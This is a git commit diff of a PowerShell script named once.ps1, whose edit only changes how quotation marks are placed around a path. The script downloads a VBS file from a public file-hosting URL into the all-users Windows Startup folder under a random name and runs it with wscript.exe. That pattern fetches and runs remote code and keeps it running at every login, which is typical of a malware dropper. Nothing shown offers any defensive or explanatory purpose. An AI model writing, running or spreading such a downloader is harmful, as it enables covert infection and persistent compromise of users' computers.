54c4eb9b63d68ffa67292fbbab234dc783861ebf
anaprivate <anathike4@gmail.com>
2025-02-06 23:52:09 +0530

    Update once.ps1

--- once.ps1
+++ once.ps1
@@ -1,7 +1,7 @@
 $url = "https://files.catbox.moe/in6cm4.vbs"
-$destination = "`"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs`""
+$destination = "`"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"`"
 
 # Download the file
 Invoke-WebRequest -Uri $url -OutFile $destination
 
-Start-Process -FilePath "wscript.exe" -ArgumentList "`"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs`"" -NoNewWindow -Wait
+Start-Process -FilePath "wscript.exe" -ArgumentList "`"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"`" -NoNewWindow -Wait
